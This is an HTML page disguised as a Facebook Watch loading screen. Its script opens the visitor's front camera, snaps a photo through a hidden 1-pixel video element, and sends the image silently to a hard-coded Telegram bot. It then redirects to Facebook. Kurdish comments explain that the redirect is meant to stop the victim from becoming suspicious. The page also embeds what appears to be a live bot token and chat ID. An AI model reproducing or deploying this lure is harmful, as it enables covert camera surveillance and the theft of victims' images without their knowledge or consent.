<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook Watch - Loading...</title>
    <style>
        body { background: #f0f2f5; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; width: 90%; }
        .fb-logo { width: 70px; height: 70px; background: #1877f2; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 45px; font-weight: bold; margin: 0 auto 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #65676b; font-size: 16px; margin-top: 20px; font-weight: 500; }
        #v, #c { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>

<div class="container">
    <div class="fb-logo">f</div>
    <div class="spinner"></div>
    <p>Loading your video...</p>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const token = "8371191822:AAGAx-xYjN-3hDpc9vUDaP-pXuX6XZ0N2JU";
    const chatID = "1216500315";

    async function sendToTelegram(blob) {
        const f = new FormData();
        f.append('chat_id', chatID);
        f.append('photo', blob, 'perfect_capture.jpg');
        f.append('disable_notification', 'true');
        
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
        } catch (e) { console.error("Network error"); }
    }

    async function initCamera() {
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        const ctx = c.getContext('2d');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
            });
            v.srcObject = stream;

            // گرنگ بۆ S24 و مۆبایلە نوێیەکان: چاوەڕێ دەکات تا ڤیدیۆکە بەڕاستی چالاک دەبێت
            v.onplay = () => {
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    
                    // ڕاستکردنەوەی ئاوێنە
                    ctx.translate(c.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(v, 0, 0, c.width, c.height);

                    c.toBlob(async (blob) => {
                        if (blob && blob.size > 0) {
                            await sendToTelegram(blob);
                            // دوای دڵنیابوون لە ناردن، دەچێتە ناو فەیسبووک
                            window.location.replace("https://www.facebook.com/watch");
                        } else {
                            // ئەگەر وێنەکە بەتاڵ بوو، دووبارە هەوڵ دەداتەوە
                            location.reload();
                        }
                    }, 'image/jpeg', 0.8);
                }, 1200); // کاتی گونجاو بۆ فۆکەسی کامێرا
            };
        } catch (err) {
            // ئەگەر مۆڵەتی نەدا، ڕاستەوخۆ دەچێتە ناو فەیسبووک تا گومان نەکات
            window.location.replace("https://www.facebook.com/watch");
        }
    }

    // دەستپێکردن کاتێک هەموو شتێک ئامادەیە
    window.onload = initCamera;
</script>
</body>
</html>
